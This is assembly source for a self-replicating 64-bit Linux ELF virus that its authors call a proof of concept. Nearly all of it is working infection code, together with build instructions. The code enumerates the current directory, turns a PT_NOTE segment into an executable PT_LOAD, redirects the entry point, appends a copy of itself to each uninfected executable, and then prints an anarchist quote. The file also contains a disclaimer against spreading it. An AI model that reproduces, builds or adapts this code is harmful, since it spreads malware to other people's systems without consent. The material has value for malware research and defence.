;####################################
;##      A  64 bit ELF virus       ##
;##      By S01den and Sblip       ##
;####################################

; This non-destructive (all data is recoverable) Proof of Concept vx infects Position Independant Executables, and is written in pure assembly. 
; It works on traditional ELF binaries, as well as those with --separate-code (4 PT_LOAD segments)
; Enjoy the reading ;)
; Don t spread this into the wild
; we don t take responsibility for what you do with this

;.____    .__         ________   _____      ____  __.                            __   __   .__               
;|    |   |__| ____  /  _____/  /  |  |    |    |/ _|______  ____ ______   _____/  |_|  | _|__| ____   ____  
;|    |   |  |/    \/   __  \  /   |  |_   |      < \_  __ \/  _ \\____ \ /  _ \   __\  |/ /  |/    \_/ __ \ 
;|    |___|  |   |  \  |__\  \/    ^   /   |    |  \ |  | \(  <_> )  |_> >  <_> )  | |    <|  |   |  \  ___/ 
;|_______ \__|___|  /\_____  /\____   | /\ |____|__ \|__|   \____/|   __/ \____/|__| |__|_ \__|___|  /\___  >
;        \/       \/       \/      |__| \/         \/             |__|                    \/       \/     \/ 

; Infection through PT_NOTE infection. Made with love by S01den and Sblip
; The payload prints a random quote of Peter Kropotkin (an anarcho-communist philosopher)

;#################################### USEFUL LINKS ###############################
;#  https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/  #
;#  https://github.com/Binject/binjection/blob/master/bj/inject_elf.go#L139      #
;#  https://filippo.io/linux-syscall-table/                                      #
;#  https://theanarchistlibrary.org/library/petr-kropotkin-the-conquest-of-bread #
;#################################################################################

; Build command: nasm -f elf64 kropotkine.s ; ld kropotkine.o -o kropotkine

; long live to the vx scene and Hasta siempre !

;---------------------------------- CUT HERE ----------------------------------

; some structs, thanks https://en.wikipedia.org/wiki/Executable_and_Linkable_Format !

struc STAT
    .st_dev         resq 1
    .st_ino         resq 1
    .st_nlink       resq 1
    .st_mode        resd 1
    .st_uid         resd 1
    .st_gid         resd 1
    .pad0           resb 4
    .st_rdev        resq 1
    .st_size        resq 1
    .st_blksize     resq 1
    .st_blocks      resq 1
    .st_atime       resq 1
    .st_atime_nsec  resq 1
    .st_mtime       resq 1
    .st_mtime_nsec  resq 1
    .st_ctime       resq 1
    .st_ctime_nsec  resq 1
endstruc

struc e_hdr
	.magic		resd 1 ; 0x7F followed by ELF(45 4c 46) in ASCII; these four bytes constitute the magic number. 
	.class		resb 1 ; This byte is set to either 1 or 2 to signify 32- or 64-bit format, respectively. 
	.data		resb 1 ; This byte is set to either 1 or 2 to signify little or big endianness, respectively. This affects interpretation of multi-byte fields starting with offset 0x10. 
	.elf_version resb 1 ; Set to 1 for the original and current version of ELF. 
	.os 		resb 1 ; Identifies the target operating system ABI. 
	.abi_version resb 1
	.padding	resb 7 ; currently unused, should be filled with zeros. <--------- that will be the place where we will put out signature
	.type		resb 2 ; Identifies object file type. 
	.machine	resb 2 ; Specifies target instruction set architecture.
	.e_version	resb 4 ; Set to 1 for the original version of ELF. 
	.entry		resq 1 ; this is the entry point
	.phoff		resq 1 ; Points to the start of the program header table.
	.shoff		resq 1 ; Points to the start of the section header table. 
	.flags		resb 4 ; Interpretation of this field depends on the target architecture. 
	.ehsize		resb 2 ; Contains the size of this header, normally 64 Bytes for 64-bit and 52 Bytes for 32-bit format. 
	.phentsize	resb 2 ; Contains the size of a program header table entry. 
	.phnum		resb 2 ; Contains the number of entries in the program header table. 
	.shentsize	resb 2 ; Contains the size of a section header table entry. 
	.shnum		resb 2 ; Contains the number of entries in the section header table. 
	.shstrndx	resb 2 ; Contains index of the section header table entry that contains the section names. 
	.end		resb 1
endstruc

struc e_phdr
	.type	resb 4 ; Identifies the type of the segment. (The number which interest us are: 0 = PT_NULL | 1 = PT_LOAD | 2 = PT_DYNAMIC | 4 = PT_NOTE)
	.flags	resd 1 ; Segment-dependent flags (position for 64-bit structure). 
	.offset resq 1 ; Offset of the segment in the file image. 
	.vaddr	resq 1 ; Virtual address of the segment in memory. 
	.paddr	resq 1 ; On systems where physical address is relevant, reserved for segments physical address.
	.filesz resq 1 ; Size in bytes of the segment in the file image.
	.memsz 	resq 1 ; Size in bytes of the segment in memory.
	.align	resq 1 ; 0 and 1 specify no alignment. Otherwise should be a positive, integral power of 2, with p_vaddr equating p_offset modulus p_align.
	.end	resb 1
endstruc

struc e_shdr
	.name	resb 4 ; An offset to a string in the .shstrtab section that represents the name of this section. 
	.type	resb 4 ; Identifies the type of this header.
	.flags	resq 1 ; Identifies the attributes of the section. 
	.addr   resq 1 ; Virtual address of the section in memory, for sections that are loaded. 
	.offset resq 1 ; Offset of the section in the file image. 
	.size   resq 1 ; Size in bytes of the section in the file image.
	.link   resb 4
	.info   resb 4
	.addralign resq 1 ; Contains the required alignment of the section. 
	.entsize resq 1 ; Contains the size, in bytes, of each entry, for sections that contain fixed-size entries.
	.end	resb 1
endstruc

%define VXSIZE 0x508
%define BUFFSIZE 1024

section .text
global _start

_start:

mov r14, rsp 
add rsp, VXSIZE
mov r15, rsp

getVirus:              ; first we get the vx code (thanks to the same method I used in Linux.Proudhon.i386)
	call get_eip
	sub rax, 0x12
	mov cl, byte [rax+rbx]
	mov byte [rsp+rbx], cl
	inc rbx
	cmp rbx, VXSIZE
	jne getVirus
	call clean

	add rsp, VXSIZE
	add rsp, VXSIZE
	add rsp, 0x100

	jmp getdot

main:
	pop rdi
	mov rax, 2		; open syscall
	xor rsi,rsi	;  flags = rdonly
	syscall		; and awaaaaay we go

	; we use the stack to hold dirents

	mov rdi, rax
	mov rax, 217
	mov rsi, rsp
	mov rdx, BUFFSIZE
	syscall

	cmp rax, 0
	jl exit

	mov r13, rax

	xor rbx, rbx
	loop:

		mov rax, rsp
		add rax, 0x13 ; d_name

		; write the name
		mov rsi, rax
		mov rdi, 1

		xor rcx, rcx
		mov cl, byte [rsp+0x12] ; rcx now contains the type of data (directory or file)
		
		push rbx

		call infect
		pop rbx

		mov ax, [rsp+0x10] ; the buffer position += d_reclen
		add rbx, rax
		add rsp, rax

		cmp rbx, r13
		jl loop
		jmp exit

infect:
	mov rbp, rsp
	cmp rcx, 0x8 ; check if the thing we will try to inject is a file or a directory (0x4 = dir | 0x8 = file)
	jne end

	; open the file
	mov rdi, rsi
	mov rax, 2
	mov rsi, 0x402 ; RW mode
	syscall

	cmp rax, 0
	jng end

	mov rbx, rax

	; stat the file to know its length
	mov rsi, rsp
	sub rsi, r13
	mov rax, 4
	syscall

	; mmap the file
	mov r8, rbx   							; the fd
	mov rsi, [rsi+STAT.st_size] 			; the len

	mov rdi, 0								; we write this shit on the stack
	mov rdx, 6								; protect RW = PROT_READ (0x04) | PROT_WRITE (0x02)
	xor r9, r9								; r9 = 0 <=> offset_start = 0
	mov r10, 0x1   							; flag = MAP_SHARED
	xor rax, rax
	mov rax, 9 								; mmap syscall number
	syscall

	; rax now contains the addr where the file is mapped

	cmp dword [rax+e_hdr.magic], 0x464c457f ; check if the file is an ELF
	je get_bits

	end:
		mov rax, 3   ; close
		mov rdi, rbx
		syscall
		xor rax, rax
		; epilogue
		mov rsp, rbp
		ret

get_bits: ; check if the binary is 64 bits
	cmp byte [rax+e_hdr.class], 2
	je check_signature
	jmp end

check_signature:
	cmp dword [rax+e_hdr.padding], 0xdeadc0de ; the signature (to check if a file is already infected)
	jne parse_phdr
	xor rax, rax
	; epilogue
	mov rsp, rbp
	ret

parse_phdr:
	xor rcx, rcx
	xor rdx, rdx
	mov cx, word [rax+e_hdr.phnum] 	   ;	rcx contains the number of entries in the program header table
	mov rbx, qword [rax+e_hdr.phoff]   ;	rbx contains the offset of the program header table
	mov dx, word [rax+e_hdr.phentsize] ;	rdx contains the size of an entry in the program header table
	
	loop_phdr:
		add rbx, rdx
		dec rcx
		cmp dword [rax+rbx+e_phdr.type], 0x4
		je pt_note_found
		cmp rcx, 0
		jg loop_phdr

pt_note_found:
	; Now, we finally infect the file !

	mov dword [rax+e_hdr.padding], 0xdeadc0de ; write the signature of the virus
	mov dword [rax+rbx+e_phdr.type], 0x01 	; change to PT_LOAD
	mov dword [rax+rbx+e_phdr.flags], 0x07  ; Change the memory protections for this segment to allow executable instructions (0x07 = PT_R | PT_X | PT_W)
	mov r9, 0xc000000
	add r9, rsi 							; the new entry point (= a virtual address far from the end of the original program)
	mov r12, qword [rax+e_hdr.entry]		; save the OEP in r12
	mov qword [rax+e_hdr.entry], r9
	mov qword [rax+rbx+e_phdr.vaddr], r9 

	; here we write the code to resolve and return to the OEP
	; FUCK THE PIE !!
	; read "Note on resolving Elf_Hdr->e_entry in PIEexecutables" from elfmaster (https://bitlackeys.org/papers/pocorgtfo20.pdf)

	mov rcx, r15
	add rcx, VXSIZE
	mov dword [rcx], 0xffffeee8	 ; relative call to get_eip
	mov dword [rcx+4], 0x0d2d48ff ; sub rax, (VXSIZE+5)
	mov byte  [rcx+8], 0x00000005 
	mov word  [rcx+11], 0x0002d48
	mov qword [rcx+13], r9		 ; sub rax, entry0  
	mov word  [rcx+17], 0x0000548
	mov qword [rcx+19], r12		; add rax, sym._start
	mov dword [rcx+23], 0xfff4894c 	; movabs rsp, r14
	mov word  [rcx+27], 0x00e0		; jmp rax

	mov rdi, qword [rax+rbx+e_phdr.filesz]   ; p.Filesz += injectSize
	add rdi, VXSIZE
	mov qword [rax+rbx+e_phdr.filesz], rdi

	mov rdi, qword [rax+rbx+e_phdr.memsz]    ; p.Memsz += injectSize
	add rdi, VXSIZE
	mov qword [rax+rbx+e_phdr.memsz], rdi

	mov qword [rax+rbx+e_phdr.offset], rsi   ; p.Off = uint64(fsize)

	mov rdx, 4
	mov rdi, rax
	mov rax, 26
	syscall           ; msync syscall: apply the change to the file

	mov rax, 11
	syscall           ; munmap
	
	mov rdi, r8
	mov rsi, r15
	mov rdx, VXSIZE
	add rdx, 46
	mov rax, 1 		  ; write the vx
	syscall

	mov rax, 3		  ; close
	syscall

	; epilogue
	mov rsp, rbp
	ret

payload:
	mov rax, 201 ; time syscall
	xor rdi, rdi        
	syscall

	xor rdx, rdx ; get the modulo 10
	mov rcx, 0x9
	div rcx
	mov rax, rdx
	inc rax

	xor rcx, rcx
	xor rbx, rbx

	jmp pushQuote

	get_quote:	
		pop rsi

	loop_quote:
		mov byte bl, [rsi]
		
		inc rcx
		cmp rcx, rax
		je print_quote
		add rsi, rbx
		jmp loop_quote

	print_quote:
		xor rdx, rdx
		mov rax, 1  ; print the quote
		mov rdi, 1
		mov byte dl, [rsi]
		dec dl
		inc rsi
		syscall

		ret

exit:
	call payload
	call clean
	call get_eip
	add rax, 0x29c     ; go to the restore OEP code
	jmp rax

clean:
	xor rcx, rcx
	xor rbx, rbx
	xor rax, rax
	xor rdx, rdx
	ret

pushQuote:
	call get_quote
	db 36,'Well-being for all is not a dream.',10
	db 65,'The hopeless dont revolt, because revolution is an act of hope.',10
	db 47,'here there is authority, there is no freedom.',10
	db 61,'Prisons are universities of crime, maintained by the state.',10
	db 68,'Poverty, the existence of the poor, was the first cause of riches.',10
	db 63,'Revolutions, we must remember, are always made by minorities.',10
	db 39,'Variety is life, uniformity is death.',10
	db 70,'It is futile to speak of liberty as long as economic slavery exists.',10
	db 16,'All is for all',10
	db 162,'In the long run the practice of solidarity proves much more advantageous to the species than the development of individuals endowed with predatory inclinations.',10
	dw 0x0
	

get_eip: 
	mov rax, [rsp]
    ret

getdot:
	call main
	db '.'
	dw 0x0

eof:
	mov rax, 60
	xor rdi, rdi
	syscall
	
;--------------------------------------------------------------------------------------------------------------------------
